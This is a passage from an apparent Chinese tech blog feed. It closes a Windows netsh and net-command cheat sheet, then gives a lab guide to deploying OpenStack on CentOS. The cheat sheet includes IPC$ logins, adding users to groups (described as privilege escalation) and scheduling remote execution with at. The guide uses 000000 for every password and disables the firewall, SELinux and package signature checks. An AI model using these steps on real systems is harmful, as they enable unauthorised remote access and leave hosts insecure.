#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　pushd interface portproxy<br>　　reset<br>　　popd<br>　　# 端口代理配置结束<br>　　# ———————————-<br>　　# 接口 IP 配置<br>　　# ———————————-<br>　　pushd interface ip<br>　　# “本地连接” 的接口 IP 配置<br>　　set address name&#x3D;”本地连接” source&#x3D;static addr&#x3D;192.168.1.5 mask&#x3D;255.255.255.0<br>　　set address name&#x3D;”本地连接” gateway&#x3D;192.168.1.1 gwmetric&#x3D;0<br>　　set dns name&#x3D;”本地连接” source&#x3D;static addr&#x3D;202.96.209.134 register&#x3D;PRIMARY<br>　　set wins name&#x3D;”本地连接” source&#x3D;static addr&#x3D;none<br>　　popd<br>　　# 接口 IP 配置结束<br>　　6、导入网络配置文件<br>　　C:&gt;netsh -f c:\dump.txt<br>　　C:&gt;netsh exec c:\dump.txt<br>win7创建无线网<br>　　1、netsh wlan set hostednetwork mode&#x3D;allow ssid&#x3D;wwl key&#x3D;12346789<br>创建但必须使用已经连接网络进行共享到该无限上<br>　　2、netsh wlan start hostednetwork<br>开启无限wifi<br>　　3、netsh wlan stop hostednetwork<br>关闭无限wifi<br>　　4、netsh wlan show hostednetwork<br>查看wifi信息</p><p>检测网络连接禁用不明服务轻松检查账户<br>Net use &#x2F;u:aspnet<br>Netsvc.exe    netsvc rcmdsvc &#x2F;start<br>Sc.exe<br>Gpedit.msc<br>Gpupdate<br>Tracert<br>Pathping</p><h2 id="NET命令"><a href="#NET命令" class="headerlink" title="NET命令"></a>NET命令</h2><p>NET命令是功能强大的以命令行方式执行的工具。使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。 或者进行用户管理和登陆管理等。</p><p>net view \ip &#x2F;&#x2F;查看远程主机共享资源<br>net use x： \IP\sharename &#x2F;&#x2F; 把远程主机的某个共享资源影射为本地盘符<br>net use $”&gt;\IP\IPC$ “password” &#x2F;user：”name” &#x2F;&#x2F;建立IPC$连接<br>net start &#x2F;&#x2F;开启远程主机的服务<br>net stop &#x2F;&#x2F;关闭远程主机的服务</p><p>net user的一些命令<br>1.net user abcd 1234 &#x2F;add，新建一个用户名为abcd，密码为1234的帐户，默认为user组成员。<br>2.net user abcd &#x2F;del，将用户名为abcd的用户删除。<br>3，net user abcd &#x2F;active：no，将用户名为abcd的用户禁用。<br>4，net user abcd &#x2F;active：yes，激活用户名为abcd的用户。<br>5，net user abcd，查看用户名为abcd的用户的情况</p><p>net localgroup<br>列出本地用户组<br>好像可以对用户组进行提权<br>net localgroup groupname username &#x2F;add.</p><p>net time<br>查看远程主机的当前时间。(时间可是非常重要哦)<br>net time \ip</p><h2 id="at"><a href="#at" class="headerlink" title="at"></a>at</h2><p>这个命令的作用是安排在特定日期或时间执行某个特定的命令和程序。当我们知道了远程主机的当前时间，就可以利用此命令让其在以后的某个时间执行某个程序和命令。<br>at time command \computer</p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>功能强大的远程登陆命令。(默认是不开启的，需要手动开启)<br>命令窗口使用telent,输入IP，然后输入账号，密码就🆗了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows网络命令&quot;&gt;&lt;a href=&quot;#Windows网络命令&quot; class=&quot;headerlink&quot; title=&quot;Windows网络命令&quot;&gt;&lt;/a&gt;Windows网络命令&lt;/h2&gt;&lt;p&gt;开始——运行——CMD——提示符后面输入命令。上下箭头键的使用，上下</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://jielunya.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>搭建openstack平台</title>
    <link href="https://jielunya.github.io/2022/11/26/%E6%90%AD%E5%BB%BAopenstack%E5%B9%B3%E5%8F%B0/"/>
    <id>https://jielunya.github.io/2022/11/26/%E6%90%AD%E5%BB%BAopenstack%E5%B9%B3%E5%8F%B0/</id>
    <published>2022-11-25T20:38:03.000Z</published>
    <updated>2022-12-03T21:34:23.643Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置ip地址、配置主机名"><a href="#配置ip地址、配置主机名" class="headerlink" title="配置ip地址、配置主机名"></a>配置ip地址、配置主机名</h2><p>controller节点：<br>网卡1：192.168.100.10<br>网卡2：192.168.200.10<br>compute节点：<br>网卡1：192.168.100.20<br>网卡2：192.168.200.20</p><p>网卡1为仅主机模式，网卡2为NAT模式，两台虚拟机密码设置为000000</p><p>建议两台节点运行内存给到6G（6144MB）</p><h4 id="cotroller-ifcfg-ens33"><a href="#cotroller-ifcfg-ens33" class="headerlink" title="cotroller ifcfg-ens33"></a>cotroller ifcfg-ens33</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=4a667240-2f76-4ddc-b0b1-65bbe67ca7d5</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.100.10</span><br><span class="line">PREFIX=24</span><br></pre></td></tr></table></figure><h4 id="cotroller-ifcfg-ens34"><a href="#cotroller-ifcfg-ens34" class="headerlink" title="cotroller ifcfg-ens34"></a>cotroller ifcfg-ens34</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens34</span><br><span class="line">UUID=3de5461f-2339-4cda-8b46-4df997c74bd5</span><br><span class="line">DEVICE=ens34</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.200.10</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.200.2</span><br></pre></td></tr></table></figure><h4 id="compute-ifcfg-ens33"><a href="#compute-ifcfg-ens33" class="headerlink" title="compute ifcfg-ens33"></a>compute ifcfg-ens33</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=ef0eaa9c-1330-4616-85d7-9a91ac44a596</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.100.20</span><br><span class="line">PREFIX=24</span><br></pre></td></tr></table></figure><h4 id="compute-ifcfg-ens34"><a href="#compute-ifcfg-ens34" class="headerlink" title="compute ifcfg-ens34"></a>compute ifcfg-ens34</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens34</span><br><span class="line">UUID=fb2363f3-8c7b-4bca-a6e5-5e23827cc644</span><br><span class="line">DEVICE=ens34</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.200.20</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.200.2</span><br></pre></td></tr></table></figure><h4 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]hostnamectl set-hostname controller</span><br><span class="line">[root@compute ~]hostnamectl set-hostname compute</span><br></pre></td></tr></table></figure><h4 id="修改hosts文件将IP地址映射为主机名"><a href="#修改hosts文件将IP地址映射为主机名" class="headerlink" title="修改hosts文件将IP地址映射为主机名"></a>修改hosts文件将IP地址映射为主机名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]vi /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line">[root@compute ~]vi /etc/hosts</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br></pre></td></tr></table></figure><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><p>compute节点,添加一块200g硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute-pjl ~]# parted /dev/sdb</span><br><span class="line">GNU Parted 3.1</span><br><span class="line">使用 /dev/sdb</span><br><span class="line">Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.</span><br><span class="line">(parted) mklabel                                                          </span><br><span class="line">新的磁盘标签类型？ gpt                                                    </span><br><span class="line">(parted) mkpart cinder 1G 101G</span><br><span class="line">(parted) mkpart swift 101G 201G                                           </span><br><span class="line">(parted) q                                                                </span><br><span class="line">信息: You may need to update /etc/fstab.</span><br><span class="line"></span><br><span class="line">[root@compute-pjl ~]# mkfs.xfs /dev/sdb1</span><br><span class="line">[root@compute-pjl ~]# mkfs.xfs /dev/sdb2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置本地yum源"><a href="#配置本地yum源" class="headerlink" title="配置本地yum源"></a>配置本地yum源</h2><h4 id="【controller】"><a href="#【controller】" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]cd /etc/yum.repos.d/</span><br><span class="line">[root@controller ~]mkdir bak</span><br><span class="line">[root@controller ~]mv *.repo bak</span><br><span class="line">[root@controller ~]vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=file:///opt/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h4 id="【compute】"><a href="#【compute】" class="headerlink" title="【compute】"></a>【compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute ~]cd /etc/yum.repos.d/</span><br><span class="line">[root@compute ~]mkdir bak</span><br><span class="line">[root@compute ~]mv *.repo bak</span><br><span class="line">[root@compute ~]vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://192.168.100.10/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h2 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h2><h4 id="【controller】-1"><a href="#【controller】-1" class="headerlink" title="【controller】"></a>【controller】</h4><p>在虚拟机右下角设置CD&#x2F;DVD<br>选择CentOS-7-x86_64-DVD-1804.iso镜像，并连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mount -o loop /dev/cdrom /mnt/</span><br><span class="line">[root@controller ~]# mkdir /opt/centos</span><br><span class="line">[root@controller ~]# cp -rvf /mnt/* /opt/centos/</span><br><span class="line">[root@controller ~]# umount /mnt/</span><br></pre></td></tr></table></figure><p>在虚拟机右下角设置CD&#x2F;DVD<br>选择chinaskills_cloud_iaas.iso镜像，并连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mount -o loop /dev/cdrom /mnt/</span><br><span class="line">[root@controller ~]# cp -rvf /mnt/* /opt/</span><br><span class="line">[root@controller ~]# umount /mnt/</span><br></pre></td></tr></table></figure><h2 id="搭建ftp服务器，开启并设置自启"><a href="#搭建ftp服务器，开启并设置自启" class="headerlink" title="搭建ftp服务器，开启并设置自启"></a>搭建ftp服务器，开启并设置自启</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum install vsftpd –y</span><br><span class="line">[root@controller ~]# vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">末尾添加 anon_root=/opt/</span><br><span class="line">wq!保存退出</span><br><span class="line">[root@controller ~]# systemctl start vsftpd</span><br><span class="line">[root@controller ~]# systemctl enable vsftpd</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙配置selinux"><a href="#关闭防火墙配置selinux" class="headerlink" title="关闭防火墙配置selinux"></a>关闭防火墙配置selinux</h2><h4 id="【controller-x2F-compute】"><a href="#【controller-x2F-compute】" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"># vi /etc/selinux/config</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><h2 id="清除缓存，验证-yum-源"><a href="#清除缓存，验证-yum-源" class="headerlink" title="清除缓存，验证 yum 源"></a>清除缓存，验证 yum 源</h2><h4 id="【controller-x2F-compute】-1"><a href="#【controller-x2F-compute】-1" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum clean all</span><br><span class="line"># yum list</span><br><span class="line"># yum repolist</span><br><span class="line">//显示repolist: 7,203即为成功。</span><br></pre></td></tr></table></figure><h2 id="编辑环境变量"><a href="#编辑环境变量" class="headerlink" title="编辑环境变量"></a>编辑环境变量</h2><h4 id="【controller-x2F-compute】-2"><a href="#【controller-x2F-compute】-2" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum install iaas-xiandian -y</span><br></pre></td></tr></table></figure><h4 id="【controller】-2"><a href="#【controller】-2" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##--------------------system Config--------------------##</span><br><span class="line">##Controller Server Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP=192.168.100.10</span><br><span class="line"></span><br><span class="line">##Controller HOST Password. example:000000</span><br><span class="line">HOST_PASS=000000</span><br><span class="line"></span><br><span class="line">##Controller Server hostname. example:controller</span><br><span class="line">HOST_NAME=controller</span><br><span class="line"></span><br><span class="line">##Compute Node Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP_NODE=192.168.100.20</span><br><span class="line"></span><br><span class="line">##Compute HOST Password. example:000000</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line">##Compute Node hostname. example:compute</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line"></span><br><span class="line">##--------------------Chrony Config-------------------##</span><br><span class="line">##Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)</span><br><span class="line">network_segment_IP=192.168.100.0/24</span><br><span class="line"></span><br><span class="line">##--------------------Rabbit Config ------------------##</span><br><span class="line">##user for rabbit. example:openstack</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line"></span><br><span class="line">##Password for rabbit user .example:000000</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------MySQL Config---------------------##</span><br><span class="line">##Password for MySQL root user . exmaple:000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Keystone Config------------------##</span><br><span class="line">##Password for Keystore admin user. exmaple:000000</span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Mysql keystore user. exmaple:000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Glance Config--------------------##</span><br><span class="line">##Password for Mysql glance user. exmaple:000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore glance user. exmaple:000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Nova Config----------------------##</span><br><span class="line">##Password for Mysql nova user. exmaple:000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore nova user. exmaple:000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Neturon Config-------------------##</span><br><span class="line">##Password for Mysql neutron user. exmaple:000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore neutron user. exmaple:000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line"></span><br><span class="line">##metadata secret for neutron. exmaple:000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line"></span><br><span class="line">##Tunnel Network Interface. example:x.x.x.x</span><br><span class="line">INTERFACE_IP=192.168.100.10</span><br><span class="line"></span><br><span class="line">##External Network Interface. example:eth1</span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line"></span><br><span class="line">##External Network The Physical Adapter. example:provider</span><br><span class="line">Physical_NAME=provider</span><br><span class="line"></span><br><span class="line">##First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101</span><br><span class="line">minvlan=101</span><br><span class="line"></span><br><span class="line">##Last Vlan ID in VLAN RANGE for VLAN Network. example:200</span><br><span class="line">maxvlan=200</span><br><span class="line"></span><br><span class="line">##--------------------Cinder Config--------------------##</span><br><span class="line">##Password for Mysql cinder user. exmaple:000000</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore cinder user. exmaple:000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line"></span><br><span class="line">##Cinder Block Disk. example:md126p3</span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line"></span><br><span class="line">##--------------------Swift Config---------------------##</span><br><span class="line">##Password for Keystore swift user. exmaple:000000</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line"></span><br><span class="line">##The NODE Object Disk for Swift. example:md126p4.</span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line"></span><br><span class="line">##The NODE IP for Swift Storage Network. example:x.x.x.x.</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.100.20</span><br><span class="line"></span><br><span class="line">##--------------------Heat Config----------------------##</span><br><span class="line">##Password for Mysql heat user. exmaple:000000</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore heat user. exmaple:000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Zun Config-----------------------##</span><br><span class="line">##Password for Mysql Zun user. exmaple:000000</span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Zun user. exmaple:000000</span><br><span class="line">ZUN_PASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Mysql Kuryr user. exmaple:000000</span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Kuryr user. exmaple:000000</span><br><span class="line">KURYR_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Ceilometer Config----------------##</span><br><span class="line">##Password for Gnocchi ceilometer user. exmaple:000000</span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore ceilometer user. exmaple:000000</span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------AODH Config----------------##</span><br><span class="line">##Password for Mysql AODH user. exmaple:000000</span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore AODH user. exmaple:000000</span><br><span class="line">AODH_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Barbican Config----------------##</span><br><span class="line">##Password for Mysql Barbican user. exmaple:000000</span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Barbican user. exmaple:000000</span><br><span class="line">BARBICAN_PASS=000000</span><br></pre></td></tr></table></figure><h4 id="【controller】-3"><a href="#【controller】-3" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /etc/xiandian/openrc.sh root@192.168.100.20:/etc/xiandian</span><br></pre></td></tr></table></figure><h4 id="【compute】-1"><a href="#【compute】-1" class="headerlink" title="【compute】"></a>【compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><p>修改一个地方即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INTERFACE_IP=192.168.100.20</span><br></pre></td></tr></table></figure><h2 id="安装openstack包"><a href="#安装openstack包" class="headerlink" title="安装openstack包"></a>安装openstack包</h2><h4 id="【controller-x2F-compute】-3"><a href="#【controller-x2F-compute】-3" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行脚本命令iaas-pre-host.sh进行安装</span><br><span class="line"># 安装完成后同时重启或者logout</span><br><span class="line">[root@controller ~]# reboot</span><br><span class="line">两台主机source /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><h2 id="安装Mysql数据库服务"><a href="#安装Mysql数据库服务" class="headerlink" title="安装Mysql数据库服务"></a>安装Mysql数据库服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-mysql.sh</span><br></pre></td></tr></table></figure><h2 id="安装Keystone认证服务"><a href="#安装Keystone认证服务" class="headerlink" title="安装Keystone认证服务"></a>安装Keystone认证服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#iaas-install-keystone.sh</span><br><span class="line">[root@controller ~]# source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller ~]# systemctl status neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><h2 id="安装Glance镜像服务"><a href="#安装Glance镜像服务" class="headerlink" title="安装Glance镜像服务"></a>安装Glance镜像服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-glance.sh</span><br><span class="line">[root@controller ~] systemctl status openstack-glance-registry</span><br></pre></td></tr></table></figure><p>上传镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller ~] cd /opt/images/</span><br><span class="line">[root@controller ~] source admin-openrc.sh</span><br><span class="line">[root@controller ~] glance image-create --name &quot;CentOS7.5&quot; --disk-format qcow2  --container-format bare --progress &lt;       /opt/images/CentOS_7.5_x86_64_XD.qcow2     </span><br></pre></td></tr></table></figure><h2 id="安装Nova计算服务"><a href="#安装Nova计算服务" class="headerlink" title="安装Nova计算服务"></a>安装Nova计算服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-nova-controller.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-nova-novncproxy</span><br><span class="line">[root@compute ~]iaas-install-nova-compute.sh</span><br><span class="line">[root@compute-pjl ~]systemctl status openstack-nova-compute</span><br></pre></td></tr></table></figure><h2 id="安装Neutron网络服务"><a href="#安装Neutron网络服务" class="headerlink" title="安装Neutron网络服务"></a>安装Neutron网络服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-neutron-controller.sh</span><br><span class="line">[root@controller ~]systemctl status neutron-server</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-neutron-compute.sh</span><br><span class="line">[root@compute-pjl ~]systemctl status neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><h2 id="安装Dashboard服务"><a href="#安装Dashboard服务" class="headerlink" title="安装Dashboard服务"></a>安装Dashboard服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-dashboard.sh</span><br><span class="line">[root@controller ~]# source /etc/keystone/admin-openrc.sh</span><br></pre></td></tr></table></figure><h2 id="安装Cinder块存储服务"><a href="#安装Cinder块存储服务" class="headerlink" title="安装Cinder块存储服务"></a>安装Cinder块存储服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-cinder-controller.sh</span><br><span class="line">[root@controller ~] systemctl status openstack-cinder-scheduler</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-cinder-compute.sh</span><br><span class="line">[root@compute-pjl ~] systemctl status openstack-cinder-volume</span><br></pre></td></tr></table></figure><h2 id="安装Swift对象存储服务"><a href="#安装Swift对象存储服务" class="headerlink" title="安装Swift对象存储服务"></a>安装Swift对象存储服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-swift-controller.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-swift-proxy</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-swift-compute.sh</span><br><span class="line">[root@compute-pjl ~] lsblk #查看sdb2是否挂载到/swift/node/sdb2</span><br></pre></td></tr></table></figure><h2 id="安装Heat编配服务"><a href="#安装Heat编配服务" class="headerlink" title="安装Heat编配服务"></a>安装Heat编配服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-heat.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-heat-engine</span><br></pre></td></tr></table></figure><h2 id="安装Zun服务"><a href="#安装Zun服务" class="headerlink" title="安装Zun服务"></a>安装Zun服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-zun-controller.sh</span><br><span class="line">[root@controller ~]# systemctl status zun-wsproxy</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-zun-compute.sh</span><br><span class="line">[root@compute-pjl ~]# systemctl status zun-compute</span><br></pre></td></tr></table></figure><p>以CentOS7_1804.tar镜像为例<br>CentOS7_1804.tar镜像包存放在XianDian-IaaS-v2.4.iso镜像包中。将docker镜像上传到glance中，通过openstack使用镜像启动容器。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] source /etc/keystone/admin-openrc.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~] cd /opt/images/</span><br><span class="line"></span><br><span class="line">[root@controller ~] openstack image create centos7.5 --public --container-format docker --disk-format raw &lt; CentOS7_1804.tar</span><br><span class="line">[root@controller ~] openstack image list</span><br></pre></td></tr></table></figure><h2 id="安装Ceilometer监控服务"><a href="#安装Ceilometer监控服务" class="headerlink" title="安装Ceilometer监控服务"></a>安装Ceilometer监控服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-ceilometer-controller.sh进行安装</span><br><span class="line">[root@controller ~]# systemctl status openstack-ceilometer-central</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-ceilometer-compute.sh进行安装</span><br><span class="line">[root@compute-pjl~]# systemctl status openstack-ceilometer-compute</span><br></pre></td></tr></table></figure><h2 id="安装Aodh监控服务"><a href="#安装Aodh监控服务" class="headerlink" title="安装Aodh监控服务"></a>安装Aodh监控服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-aodh.sh</span><br><span class="line">[root@controller ~]# systemctl status openstack-aodh-listener</span><br></pre></td></tr></table></figure><h2 id="添加控制节点资源到云平台"><a href="#添加控制节点资源到云平台" class="headerlink" title="添加控制节点资源到云平台"></a>添加控制节点资源到云平台</h2><h4 id="【controller】-4"><a href="#【controller】-4" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] vi /etc/xiandian/openrc.sh </span><br><span class="line"></span><br><span class="line">#Compute Node Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP_NODE=192.168.100.10</span><br><span class="line"></span><br><span class="line">#Compute HOST Password. example:000000</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line">#Compute Node hostname. example:compute</span><br><span 